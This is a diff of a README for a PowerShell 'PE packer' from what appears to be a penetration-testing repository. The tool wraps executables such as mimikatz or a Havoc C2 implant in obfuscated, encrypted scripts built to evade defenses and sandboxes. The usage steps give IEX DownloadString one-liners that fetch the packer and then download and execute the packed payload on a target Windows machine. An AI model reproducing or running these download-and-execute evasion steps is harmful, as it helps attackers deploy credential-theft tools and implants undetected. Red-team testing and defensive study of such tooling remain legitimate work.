@@ -15,24 +15,28 @@ It generates an obfuscated and encrypted PowerShell script that contains the PE 
     - wait for 60 seconds before execution
   
 #### USAGE
-  - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server.
+  - STEP 1. Generate an obfuscated & encrypted PowerShell script that contains your PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server.
 ```
-PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
-PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
---- or ---
-PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
-``` 
+[*] First load the PePacker
+    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');
+
+[*] Then "pack/obfuscate" a Portable Executable file stored locally (with or without the sandbox checks enabled)
+    PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
+    --- or ---
+    PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
+
+[*] Or download and "pack/obfuscate" a Portable Executable file stored on a remote web server 
+    PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 
+    --- or ---
+    PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
 ```
-PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
-PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 
---- or ---
-PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
-```
-  - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your PE file) on a target Windows computer
+#### 
+  - STEP 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your PE file) on a target Windows computer
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE
 --- or ---
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE argument1 argument2 ...
+
 --- or (not recommended) ---
 PS C:\> WGET -URI https://URL/Packed-PE-file.ps1 -OutFile C:\temp\Packed-PE-file.ps1
 PS C:\> Import-Module C:\temp\Packed-PE-file.ps1
